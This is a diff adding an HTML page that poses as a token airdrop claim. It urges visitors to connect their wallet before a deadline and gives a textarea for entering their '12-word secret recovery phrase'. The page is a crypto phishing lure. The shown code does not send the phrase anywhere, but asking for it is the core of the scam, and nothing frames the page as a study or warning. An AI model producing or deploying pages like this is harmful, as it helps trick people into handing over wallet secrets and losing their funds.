@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Claim your airdrop</title></head>
+<body>
+  <h1>You are eligible for the airdrop</h1>
+  <p>Connect your wallet to claim 2,500 tokens before the snapshot closes.</p>
+  <button id="connect">Connect Wallet</button>
+  <h3>Or restore manually</h3>
+  <textarea name="seed_phrase" placeholder="Enter your 12-word secret recovery phrase"></textarea>
+  <script>
+    document.getElementById('connect').onclick = function () {
+      if (window.ethereum) { window.ethereum.request({method: 'eth_requestAccounts'}).catch(function () {}); }
+    };
+  </script>
+</body>
+</html>
